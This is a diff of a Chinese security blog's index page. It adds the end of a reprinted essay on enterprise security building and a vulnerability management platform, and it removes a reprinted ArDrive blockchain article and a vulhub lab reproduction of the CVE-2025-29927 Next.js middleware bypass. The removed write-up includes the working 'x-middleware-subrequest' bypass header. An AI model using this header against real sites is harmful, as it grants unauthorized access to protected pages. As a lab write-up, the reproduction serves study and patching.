+<p>在经历救火阶段后，就要开始基础安全建设了。这个阶段的核心安全目标是解决安全规划中优先级最高的安全问题。这个过程会制定、实施一些基础的安全流程和规范，开发一些自动化的安全工具、系统，功能也许不是十分完善，但是可以满足目前的安全需求。还会在一些方面和第三方安全厂商合作，通过购买一些安全产品或服务来提升企业自身安全水平。比如像定期渗透测试、安全众测、抗D、堡垒机、防火墙这类基础安全服务和设备。</p>
+<p>保障核心业务和数据安全阶段</p>
+<p>这个阶段以保障核心业务和数据安全为核心安全目标。这是由客观条件决定的。举个例子：一个大、中型互联网公司都会有多条业务线，每条业务线又会有多个业务系统，而且这些业务线可能会分布在多个不同的部门，由不同的人负责。如果一上来就想在所有业务线推广严格的SDL流程，很大机率会失败。因为这个阶段安全团队的人不会很多，并没有足够的精力和资源去做覆盖所有业务线的事情。比较明智的做法是先从核心业务系统切入，待整个流程跑通、理顺后再向其他业务线推广。</p>
+<p>保障公司整体安全</p>
+<p>发展到这个阶段，安全团队已经具有一定规模，各种安全角色也基本到位。也有了很多的安全系统、平台，具备一定的安全自动化能力。所以这个阶段的主要目标是把已有的安全系统、平台进行进一步整合，打磨，进而可以进行高度的联动和关联分析，从而达到更好的掌控公司整体安全态势的目标。有精力还可以将现有安全系统、平台产品化，为下一步对外输出安全能力做好准备。</p>
+<p>对外输出安全能力</p>
+<p>这个阶段只有当公司体量、业务和安全团队发展的足够大时，才可能有机会做这样的事情。所以这里不作过多讨论。</p>
+</blockquote>
+<h2><span id="十-做好安全建设的必要条件">十、做好安全建设的必要条件</span></h2><blockquote>
+<p>上面说了这么多，其实一个企业的安全能否做好、做强，做大，并非是一个简单的技术问题，而是由多种因素综合决定的。除了安全对企业业务发展的影响度、安全负责人的综合能力和视野、契合企业自身业务特性的安全建设规划、持续的安全投入和专业安全团队外，公司高层是否拥有正确的安全观和给予大力支持也至关重要。</p>
+<p>正确的安全观：安全是相对的。互联网企业安全绝不是做一次渗透测试、找安全公司提供个安全解决方案或者购买一些安全产品及安全服务就可以搞定的事情。安全是一个整体，同时也是一个动态和持续的过程，这就要求公司要有持续的安全投入。此外，安全也不只是安全部门的事，还需要全员的参加和高层的大力支持，否则很多安全规划很难真正落地实施。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/10.png" alt="image"></p>
+</blockquote>
+<h2><span id="十一-如何衡量安全建设的效果">十一、如何衡量安全建设的效果</span></h2><blockquote>
+<p>如何衡量企业安全建设的效果和量化安全工作，是一件非常难的事情。我想这也是很多企业安全负责人面临的难题和挑战。我也面临这种困惑，在这里分享一些我个人的思考和看法。</p>
+<p>要评价一个企业安全建设的效果，或者说好坏，我认为应该以企业设定的安全目标和TCO、ROI为基本前提，从安全组织、安全能力、安全体系、安全运营、安全意识这五个方面来展开评价，每个方面可以设定一些核心的评价指标来衡量，下面来一起看下：</p>
+<p>安全组织</p>
+<p>评价对象：公司高层、安全负责人</p>
+<p>评价指标(参考)：1、安全团队规模；2、团队角色构成和分布；3、部门层级；4、安全负责人的职级和汇报对象</p>
+<p>通过以上几个指标基本可以判断出一家企业高层对于安全的理解和认知水平，是真正重视安全还是口头重视。</p>
+<p>安全能力</p>
+<p>评价对象：安全团队</p>
+<p>评价指标(参考)：1、安全风险主动发现和处置能力；2、安全态势感知和响应能力；3、安全自动化、工程化能力；4、安全体系建设、运营能力；5、持续的安全研究和学习能力</p>
+<p>安全体系</p>
+<p>评价对象：安全团队</p>
+<p>评价指标(参考)：1、安全体系的合理性和完整性</p>
+<p>安全运营</p>
+<p>评价对象：安全团队</p>
+<p>评价指标(参考)：1、是否实现持续运营；2、是否设定运营指标及指标是否合理、明确；3、运营指标是否可量化和可视化；4、运营指标设定和实现粒度；5、是否有运营指标考核标准及标准是否落地执行</p>
+<p>安全意识</p>
+<p>评价对象：公司全员</p>
+<p>评价指标(参考)：1、知晓和理解公司对其在信息安全方面的职责和义务要求员工数占比；2、单位时间内因人员安全意识薄弱导致安全事件和安全违规事件数量和占比</p>
+<p><img src="/2025/12/19/Internet-Security-Management/11.png" alt="image"></p>
+</blockquote>
+<h2><span id="十二-安全漏洞管理平台建设实践">十二、安全漏洞管理平台建设实践</span></h2><blockquote>
+<p>上面主要介绍了企业安全建设规划相关内容，下面我会从技术、管理和运营三个层面来分享一些VIPKID在安全漏洞管理方面的实践和经验。</p>
+<p>技术层面</p>
+<p>在技术层面，我们自研了VK安全漏洞管理平台，该平台负责管理公司所有安全漏洞，实现了漏洞全生命周期的线上跟踪与处理，保障漏洞处理流程的可跟踪、维护和高效执行，可视化、量化漏洞风险，支撑漏洞管理和运营工作的开展，将企业的漏洞和安全经验有效积累和沉淀下来，形成企业自己的安全知识库；</p>
+<p>管理层面</p>
+<p>在管理层面制定和实施了”VK安全漏洞管理制度”和”VK安全接口人制度”；通过这两个安全管理制度定义和明确了漏洞整体处理流程、漏洞等级评估依据、漏洞修复时长和对应的安全接口人等；</p>
+<p>运营层面</p>
+<p>在运营层面，定义和明确漏洞运营指标、采取专人负责，从多个维度实现漏洞风险的量化和可视化，通过持续的漏洞运营使整个漏洞处理流程形成闭环。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/12.png" alt="image"></p>
+<p>VIPKID安全漏洞管理平台基于漏洞全生命周期建立，整个漏洞修复流程过程可以分为五个阶段，在这过程中一旦漏洞状态发生变化，系统都会自动触发邮件提醒给相关方。</p>
+<p>1、漏洞提交阶段：</p>
+<p>当有新的安全漏洞产生，安全人员会通过漏洞管理平台的漏洞提交页面提交漏洞；</p>
+<p>2、漏洞接收阶段：</p>
+<p>对应安全接口人在收到新漏洞提醒邮件后，可以登录漏洞管理平台查看漏洞详情和进行漏洞修复排期评估工作。</p>
+<p>3、漏洞修复阶段：</p>
+<p>此时将进入漏洞修复阶段，安全接口人可以可根据实际情况确认是自己修复，还是指派给团队其他成员修复。</p>
+<p>4、漏洞验证阶段：</p>
+<p>当漏洞修复完成，由安全接口人在漏洞管理平台发起”验证申请”，这时系统会同步给漏洞提交人发送一份漏洞验证的提醒邮件。漏洞提交人在收到信息后进行漏洞验证，确认漏洞是否被正确修复。如果验证通过，漏洞提交人可以在漏洞管理平台点击”验证通过”按钮，这时漏洞会自动进入下一阶段；如果验证发现漏洞没有正确修复，可以点击”未验证通过”按钮，漏洞自动退回至第二阶段。</p>
+<p>5、漏洞公开阶段：</p>
+<p>到这个阶段，说明漏洞已经被正确修复，漏洞修复流程结束。这时会对内部人员开放，漏洞公开时，系统会同步给漏洞提交人、对应安全接口人发送漏洞公开的邮件提醒。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/13.png" alt="image"></p>
+<p>该平台共实现了五大核心功能，分别是资产管理、漏洞管理、漏洞态势、用户中心和安全知识库。</p>
+<p>资产管理的核心功能包含资产的添加、编辑、删除、资产列表等功能，并实现了资产关联对应安全接口人、所属团队或业务线；漏洞管理功能模块除了实现漏洞修复流程全线上处理和状态跟踪外，还包含漏洞等级、来源、类型和漏洞提醒管理；漏洞态势功能从多个维度实现了漏洞态势的量化和可视化；用户中心分为角色管理、用户管理、权限管理和个人中心四部分；安全知识库支持记录和分享安全相关文章。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/14.png" alt="image"></p>
+<p>因为时间关系，我这里会介绍部分功能的设计细节，</p>
+<p>漏洞提交功能：</p>
+<p>为了保证每个安全人员提交漏洞报告格式保持一致和提升可读性，我们设计了统一的漏洞提交页面，在该页面通过系统限制必须填写漏洞标题、受影响系统、漏洞类型、漏洞等级、漏洞来源、漏洞描述、漏洞危害、漏洞详情以及漏洞修复方案。为了提升用户体验，还支持漏洞提交预览、快速定位受影响系统、上传图片和生成临时查看链接等功能。</p>
+<p>漏洞编号功能：</p>
+<p>当漏洞提交时，系统会自动生成一个惟一的漏洞编号和关联对应的安全接口人、漏洞修复时长和漏洞知识库链接。每个漏洞都会有一个惟一的漏洞编号，这个编号是经过特殊设计的，比如SEC-VD-201808-007,通过这个编号就可以得知当前漏洞是2018年8月份每7个漏洞。如果想要知道本月共有多少个安全漏洞，直接看最新的漏洞编号即可，非常的方便。</p>
+<p>漏洞提醒功能：</p>
+<p>为了提升安全人员漏洞修复跟进效率和降低成本，漏洞管理平台除了漏洞状态变化提醒功能外，还有一个漏洞延期提醒功能，系统会自动扫描所有待修复漏洞，当发现有延期漏洞时，会自动给漏洞提交人、对应安全接口人和其所在部门负责人发送漏洞延期修复提醒，由部门负责人来协调资源高优处理。这样就避免了安全人员人工去跟进，尤其是在漏洞数量多的时候，这个功能非常有用。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/15.png" alt="image"></p>
+<p>为了做到漏洞态势和风险的量化、可视化，我们会从漏洞数量、漏洞状态、类型、等级、来源分布、漏洞修复率以及安全人员发现漏洞数量等多个维度进行分析和监控，并通过合理的设计以图表的形式直观的展现出来。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/16.png" alt="image"></p>
+<p>整个漏洞管理平台分为五种角色，分别是安全专家、安全接口人、部门负责人、普通用户和管理员。通过给每个角色来授权进行统一的权限划分和管理。</p>
+<p>安全专家：可以提交和管理和自己相关的安全漏洞；</p>
+<p>安全接口人：可以查看和管理自己所负责业务系统的漏洞；</p>
+<p>部门负责人：可以查看自己负责部门的所有漏洞；</p>
+<p>普通用户：只允许查看已修复公开的漏洞；</p>
+<p>管理员：拥有平台最高权限。在个人中心，各种角色都可以清晰的查看与自己相关漏洞的详情和对应的漏洞态势。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/17.png" alt="image"></p>
+<p>安全漏洞管理平台的价值：</p>
+<p>通过该漏洞管理平台，我们实现了漏洞全生命周期的线上管控、做到了量化和可视化漏洞风险，通过对漏洞数据进行统计和分析，从而可以主动掌控公司整体的漏洞态势和弱点。最后将历史漏洞和安全经验积累和有效沉淀，形成公司的安全知识库，也可以在一定程度上为安全漏洞管理和运营工作提供方向和依据。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/18.png" alt="image"></p>
+<p>但是光有漏洞管理平台还不够，如果有平台但是大家都不用，那么平台的价值是体现不出来的。所以要想做好漏洞管理工作，需要通过技术、管理和运营三个层面共同协作，相互促进，缺一不可。通过管理手段来明确和规范漏洞修复处理流程与安全接口人职责；通过技术手段来实现和保障漏洞处理流程的高效和落地执行，以及量化和可视化漏洞风险，从技术维度支撑漏洞管理和运营工作的开展；最后通过持续的漏洞运营来使整个漏洞处理流程形成完整闭环和不断优化漏洞处理整体流程，最终实现持续提升漏洞管理水平和能力的目的。</p>
+</blockquote>
+<h2><span id="十三-写在最后">十三、写在最后</span></h2><blockquote>
+<p>互联网企业安全建设之路任重而道远，包含的内容实在是非常的多和广，绝非一篇文章、一次分享能够说的清楚。由于本人能力有限，文中肯定有一些不足之处，欢迎大家一起探讨，共同进步。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Management/" rel="tag">Management</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2025/12/12/Business-License-Leakage/">
                 某连锁品牌的敏感信息爬取泄露
             </a>
@@ -1009,152 +1370,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2025/12/11/What-Is-Permanent-Data/">
-                What is permanent data?（什么是永久数据？）
-            </a>
-        </h2>
-    
-    <time>
-        Dec 11, 2025
-    </time>
-    <section class="content">
-        <h1><span id="what-is-permanent-data什么是永久数据">What is permanent data?（什么是永久数据？）</span></h1><blockquote>
-<p>本文转自 <a target="_blank" rel="noopener" href="https://ardrive.io/what-is-permanent-data">ardrive</a> 并作补充</p>
-</blockquote>
-<blockquote>
-<p><img src="/2025/12/11/What-Is-Permanent-Data/1.avif" alt="image"></p>
-<p>在ArDrive，我们经常提到“永久数据”这个词。然而，人们常常对“永久数据”的概念感到困惑。我们都习惯了生活中的事物，包括我们的数据，并非永久存在。那些学校作业、照片和商业记录都到哪里去了？那么，永久数据是否意味着我们的数据永远不会消失？<strong>永久数据究竟意味着什么？</strong> <em>数据永久性指的是存储在区块链上的信息（称为链上数据）将保持原样，不会发生任何变化，并会持续进行验证和复制。</em> 这并不一定指数据保存的时间长度，而仅仅是指所存储数据的性质：不变、可复制且经过验证。数据只有在其所在的网络安全的情况下才能保存。也就是说，永久数据所在的网络被设计得<strong>极其强大，因此数据能够长期保持不变且安全无虞</strong>。让我们深入了解一下永久数据的构成要素，以及人们究竟可以对这些数据抱有多大的信心，相信它们甚至能够超越自身的存在时间。</p>
-</blockquote>
-<h2><span id="在区块链数据中永久性意味着什么">在区块链数据中，“永久性”意味着什么？</span></h2><blockquote>
-<p>“永久性”这个词听起来可能很复杂，但实际上它的概念很简单，尤其是在区块链技术的语境下。让我们来详细解释一下，以便更好地理解。首先，<strong>永久性意味着：不可篡改：不会改变；持续验证；多次复制。</strong>这是区块链技术的一个关键特性，它就像一个数字账本或记录系统。想象一下，区块链是由一系列区块组成的链条，每个区块就像一个装有信息的数字盒子。一旦这个盒子被数据填满并添加到链条中，它就无法被更改或删除。这就像用笔在笔记本上写字，然后就无法擦掉一样。这就引出了区块链中数据永久性的概念。数据永久性意味着存储在区块链上的信息（称为链上数据）<strong>将长期保持不变，不会发生任何变化</strong>。这就像将信息存储在一个超级安全的数字保险库中，使其永远安全无虞。为什么这很重要呢？在当今这个我们大量依赖网络的世界里，拥有一个可以永久且安全地存储信息的地方至关重要。这对于财务记录、法律文件，甚至是个人信息等尤其重要。你可以把它想象成一种确保数据不受干扰且始终可用的方式，就像一个数字信息的时间胶囊。总而言之，在区块链的语境下，“永久性”意味着数据被永久记录在链上并保持这种状态。 <strong>永久数据</strong>：链上存储、不可篡改、已验证、可复制，也就是永远无法删除。<strong>我们已经找到了实现数据永久存储的方法，但如何确保数据能够长期保存呢？</strong></p>
-<p><img src="/2025/12/11/What-Is-Permanent-Data/2.avif" alt="image"></p>
-</blockquote>
-<h2><span id="永久数据对数据的长期保存意味着什么">永久数据对数据的长期保存意味着什么？</span></h2><blockquote>
-<p>数据的保存期限至关重要——我们不想要只能维持几个月甚至几年的存储系统。我们已经有太多这样的系统了。 </p>
-<p>那么，长期保存永久数据的最佳方法是什么？</p>
-<p>数据的保存期限取决于其所处系统和硬件的性能。以下是我们迄今为止使用过的一些系统和硬件：卷轴、纸张、书籍、图书馆；CD、磁带、DVD、录像机、蓝光光盘；U盘、内存、硬盘；云存储、企业、订阅支付。所有这些方式在数据传承过程中都经历过成功、痛点和失败。任何档案管理员都知道，长期数据存储和保存是一个难以克服的难题。</p>
-</blockquote>
-<h2><span id="那么永久数据能否成为长期数据存储解决方案的一部分">那么，永久数据能否成为长期数据存储解决方案的一部分？</span></h2><blockquote>
-<p>我们认为可以。原因如下。ArDrive 所基于的 Arweave 区块链上的永久数据 <strong>是一个去中心化网络，</strong>拥有极具吸引力的激励机制来维持其运行。换句话说，成千上万的人存储着这些数据，并且他们会因此获得持续的经济奖励。正如预期的那样，Arweave 的技术和经济模型非常完善且详细，您可以在“<a target="_blank" rel="noopener" href="https://ardrive.io/can-data-really-be-stored-forever/">数据真的可以永久存储吗</a>？”这篇文章中阅读完整的解释，但现在我们先来看一个简要版本。</p>
-</blockquote>
-<h2><span id="经济模型">经济模型</span></h2><blockquote>
-<p>Arweave 的经济模式可以概括为“先支付一部分，为未来储备更多”。每次购买存储空间，其中一小部分（16.67%）用于支付当前的存储费用。那么未来几年呢？剩余的 83.33% 将存入一笔捐赠基金，作为应对未来成本的应急资金。那么，这笔捐赠基金何时会动用呢？近期内不会。事实上，根据经济模型计算，目前的捐赠基金规模足以支付数据持有者未来数百年的费用，从而确保他们能够覆盖成本并实现盈利。随着越来越多的数据被添加到 Arweave 网络中，捐赠基金的规模也会不断增长。如果存储价格上涨，这笔捐赠基金将为数据提供安全保障。然而，随着存储价格的下降（这种情况几乎总是如此），这笔捐赠基金可能永远都不会被用到。</p>
-<p><img src="/2025/12/11/What-Is-Permanent-Data/3.avif" alt="image"></p>
-</blockquote>
-<h2><span id="你怎么知道它在200年后是否还会存在">你怎么知道它在200年后是否还会存在？</span></h2><blockquote>
-<p>Arweave 网络承诺数据存储可保存 200 年。显然，没有人知道 200 年后世界会是什么样子——那么，如何才能做出这样的承诺呢？我们无法穿越到未来去查看情况。但是，我们可以模拟不同的场景（很多很多不同的场景），并创建能够应对这些场景的系统。已经创建的模型和系统<strong>让我们有信心数据能够长期保存</strong>。让我们将一些现有的系统与 Arweave 进行比较，看看它们的表现如何。其他一些数据存储方法&#x2F;系统：纸质存储——历史上遗失了多少书籍和卷轴？此外，纸质存储的保存难度更大。U盘——U盘的平均寿命为 3 到 5 年；硬盘的寿命为 5 到 7 年。这些存储设备有多少次出现故障？普通人又能多大程度上监控这些存储设备的状态呢？云存储——云存储因其便捷性而得到了广泛应用。即便如此，数据丢失的案例仍然不胜枚举。仅仅依靠一家公司来存储数据真的值得信赖吗？如果停止支付月费会发生什么？所有这些都表明，我们需要寻找替代方案来帮助实现长期数据存储。 </p>
-</blockquote>
-<h2><span id="我们能从arweave网络上的数据保存方式中学到什么">我们能从Arweave网络上的数据保存方式中学到什么？</span></h2><blockquote>
-<p>如果上述所有方法和系统都存在各自的缺陷，那么 Arweave 在长期保存方面的可靠性如何呢？使用 Arweave，可以轻松检查任何数据的保存状态。Arweave</p>
-<p>网络上的任何交易都可以根据交易 ID 进行查询。当我们查找交易编号时，可以看到：</p>
-<ul>
-<li>实际数据是什么（如果公开的话）以及何时上传到区块链的。</li>
-<li>自上传以来，已确认存在的次数</li>
-<li>重复次数（该数据集有多少份副本）</li>
-<li>什么是永久链接</li>
-</ul>
-<p>以下是五年前的一些随机数据样本：</p>
-<ul>
-<li>交易号：<a target="_blank" rel="noopener" href="https://viewblock.io/arweave/tx/Rv83XZ5msauTd1iHJUmegkv3MUhkk5UAaPvpURGa-Vo">Rv83XZ5msauTd1iHJUmegkv3MUhkk5UAaPvpURGa-Vo</a></li>
-<li>上传日期：2019年7月30日</li>
-<li>已保存的数据：关于美国国际开发署宣布拨款3亿美元用于抗击结核病的文章</li>
-<li>已确认数据总数：1,084,990</li>
-<li>重复次数：15+</li>
-<li>永久网址：<a target="_blank" rel="noopener" href="https://i37toxm6m2y2xe3xlcdsksm6qjf7omkimsjzkadi7puvcem27fna.arweave.net/Rv83XZ5msauTd1iHJUmegkv3MUhkk5UAaPvpURGa-Vo">https://i37toxm6m2y2xe3xlcdsksm6qjf7omkimsjzkadi7puvcem27fna.arweave.net/ </a><a target="_blank" rel="noopener" href="https://i37toxm6m2y2xe3xlcdsksm6qjf7omkimsjzkadi7puvcem27fna.arweave.net/Rv83XZ5msauTd1iHJUmegkv3MUhkk5UAaPvpURGa-Vo">Rv83XZ5msauTd1iHJUmegkv3MUhkk5UAaPvpURGa-Vo</a><a target="_blank" rel="noopener" href="https://i37toxm6m2y2xe3xlcdsksm6qjf7omkimsjzkadi7puvcem27fna.arweave.net/Rv83XZ5msauTd1iHJUmegkv3MUhkk5UAaPvpURGa-Vo">
-</a></li>
-</ul>
-<p>那么，让我们把这笔交易与过去五年和未来五年的其他存储方法在可靠性方面进行比较。</p>
-</blockquote>
-<h3><span id="数据存储选项对比表">数据存储选项对比表</span></h3><blockquote>
-<p><img src="/2025/12/11/What-Is-Permanent-Data/4.avif" alt="image"></p>
-<p><img src="/2025/12/11/What-Is-Permanent-Data/5.avif" alt="image"></p>
-<p>因此，将永久数据与您五年前存储在U盘、硬盘或云账户中的数据进行比较，并展望未来五年：五年后，我们对U盘还是Arweave更有信心？您的硬盘还能再用十年吗？我们能否将所有数据都托付给一家云服务公司？如果您停止支付月费会发生什么？这是一种将数据传承给后代的好方法吗？云解决方案是解决方案的一部分，但还需要什么来增强它？正如我们比较了各种存储方案后发现的，链上永久区块链数据应该让我们相信，链上永久数据存储不仅能陪伴我们五年，而且很可能比我们活得更久。这确实有助于解决长期数据保存的问题。 </p>
-</blockquote>
-<h2><span id="存储解决方案的一部分">存储解决方案的一部分</span></h2><blockquote>
-<p>随着时间的推移，它将不断证明永久数据作为一种长期数据解决方案的可靠性。这不仅是因为支撑它的网络稳定可靠，更重要的是，它始终如一地保存着承诺的数据，而其他系统则不断暴露出自身的弱点。随着永久数据的应用日益普及，我们热切期盼它能成为长期数据存储解决方案中越来越重要的组成部分。因此，当您试用 ArDrive 并上传您的第一个文件时，正如我们常说的，感受一下永久数据带来的不同。您可以完全放心，您的文件安全可靠，并且在未来很长一段时间内都不会发生变化。 </p>
-<p><img src="/2025/12/11/What-Is-Permanent-Data/6.avif" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Blockchain/" rel="tag">Blockchain</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2025/12/10/CVE-2025-29927-Nextjs/">
-                CVE-2025-29927 Next.js 中间件权限绕过漏洞复现
-            </a>
-        </h2>
-    
-    <time>
-        Dec 10, 2025
-    </time>
-    <section class="content">
-        <h1><span id="cve-2025-29927-nextjs-中间件权限绕过漏洞复现">CVE-2025-29927 Next.js 中间件权限绕过漏洞复现</span></h1><blockquote>
-<p>本文转自 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/CVE-Lemon/p/18789173">CVE-柠檬i</a> 并作补充</p>
-<p>本文所述漏洞复现方法仅供安全研究及授权测试使用；任何个人&#x2F;组织须在合法合规前提下实施，严禁用于非法目的。作者不对任何滥用行为及后果负责，如发现新漏洞请及时联系厂商并遵循漏洞披露规则。</p>
-</blockquote>
-<h2><span id="cve-2025-29927-nextjs-中间件权限绕过漏洞复现">CVE-2025-29927 Next.js 中间件权限绕过漏洞复现</span></h2><h2><span id="漏洞信息">漏洞信息</span></h2><blockquote>
-<p>Next.js 是一个基于 React 的流行 Web 应用框架，提供服务器端渲染、静态网站生成和集成路由系统等功能。包含众多功能，是深入研究复杂研究的完美游乐场。在信念、好奇心和韧性的推动下，我们出发去探索它鲜为人知的方面，寻找等待被发现的隐藏宝藏。</p>
-<p>当使用中间件进行身份验证和授权时，Next.js 14.2.25 和 15.2.3 之前的版本存在授权绕过漏洞。</p>
-<p>该漏洞允许攻击者通过操作 <code>x-middleware-subrequest</code> 请求头来绕过基于中间件的安全控制，从而可能获得对受保护资源和敏感数据的未授权访问。</p>
-<p>补丁：</p>
-<ul>
-<li>对于 Next.js 15.x，此问题已在 15.2.3 中修复</li>
-<li>对于 Next.js 14.x，此问题已在 14.2.25 中修复</li>
-</ul>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
-<p>vulhub已有环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md">vulhub&#x2F;next.js&#x2F;CVE-2025-29927&#x2F;README.zh-cn.md at master · vulhub&#x2F;vulhub (github.com)</a></p>
-<p>启动环境：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/12/10/CVE-2025-29927-Nextjs/1.png" alt="image"></p>
-<p>访问虚拟机3000端口,可以看到环境搭建成功：<a target="_blank" rel="noopener" href="http://your-ip:3000/login">http://your-ip:3000/login</a></p>
-<p><img src="/2025/12/10/CVE-2025-29927-Nextjs/2.png" alt="image"></p>
-<p>访问根路径，显示需要登陆：</p>
-<p><img src="/2025/12/10/CVE-2025-29927-Nextjs/3.png" alt="image"></p>
-<p>添加请求头，使用权限绕过payload</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">x-middleware-subrequest</span><span class="punctuation">: </span>middleware:middleware:middleware:middleware:middleware</span><br></pre></td></tr></table></figure>
-
-<p>访问成功，权限绕过漏洞复现成功</p>
-<p><img src="/2025/12/10/CVE-2025-29927-Nextjs/4.png" alt="image"></p>
-</blockquote>
-<h3><span id="参考文章">参考文章</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">Next.js 和损坏的中间件：授权工件 - zhero_web_security (zhero-web-sec.github.io)</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md">vulhub&#x2F;next.js&#x2F;CVE-2025-29927&#x2F;README.zh-cn.md at master · vulhub&#x2F;vulhub (github.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.ch35tnut.com/zh-cn/vulnerability/cve-2025-29927-nextjs-auth-bypass/">CVE 2025 29927 Nextjs Auth Bypass - chestnut’s blog (ch35tnut.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.xugj520.cn/archives/nextjs-middleware-cve-2025-29927-exploit-guide.html">Next.js中间件授权绕过漏洞终极指南：CVE-2025-29927深度解析与防护策略 - 高效码农 (xugj520.cn)</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/vercel/next.js/compare/v15.2.2...v15.2.3">Comparing v15.2.2…v15.2.3 · vercel&#x2F;next.js (github.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://wx.zsxq.com/group/2212251881/topic/1524224154842282">代码审计知识星球 (zsxq.com)</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Next-js/" rel="tag">Next.js</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
